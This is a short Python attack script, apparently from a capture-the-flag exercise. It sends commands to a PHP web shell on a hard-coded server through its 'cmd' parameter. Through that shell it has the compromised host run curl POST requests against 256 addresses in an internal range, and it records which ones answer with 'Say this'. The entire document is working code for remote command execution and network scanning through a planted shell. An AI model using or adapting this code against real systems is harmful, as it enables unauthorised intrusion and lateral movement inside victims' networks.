import requests

base_url = "http://103.77.175.40:11121/images/w.php?"   #cmd=curl%201.3.3.7"
s = requests.Session()

cage = []
for i in range(256):
    
    target_url = base_url + f'cmd=curl 1.3.3.{i} -X POST -d word=a'
    r = s.get(url=target_url)
    
    if "Say this" in r.text:
        cage.append(i)
        print(f"One cage found here: 1.3.3.{i}" )